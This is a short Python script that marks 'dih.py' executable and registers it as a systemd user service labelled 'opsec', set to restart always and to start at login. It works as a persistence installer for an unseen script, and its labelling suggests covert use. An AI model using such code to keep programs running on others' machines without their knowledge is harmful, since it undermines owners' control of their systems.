#!/usr/bin/env python3
import os
import stat
import subprocess

script_name = "dih.py"

st = os.stat(script_name)
os.chmod(script_name, st.st_mode | stat.S_IXUSR)

f_path = os.path.abspath(script_name)


systemd_user_dir = os.path.expanduser("~/.config/systemd/user")
os.makedirs(systemd_user_dir, exist_ok=True)

service_file = os.path.join(systemd_user_dir, f"{script_name}.service")

service_content = f"""[Unit]
Description=opsec
After=network.target

[Service]
ExecStart={f_path}
Restart=always

[Install]
WantedBy=default.target
"""

with open(service_file, "w") as f:
    f.write(service_content)


subprocess.run(["systemctl", "--user", "daemon-reload"])
subprocess.run(["systemctl", "--user", "enable", f"{script_name}.service"])
subprocess.run(["systemctl", "--user", "start", f"{script_name}.service"])
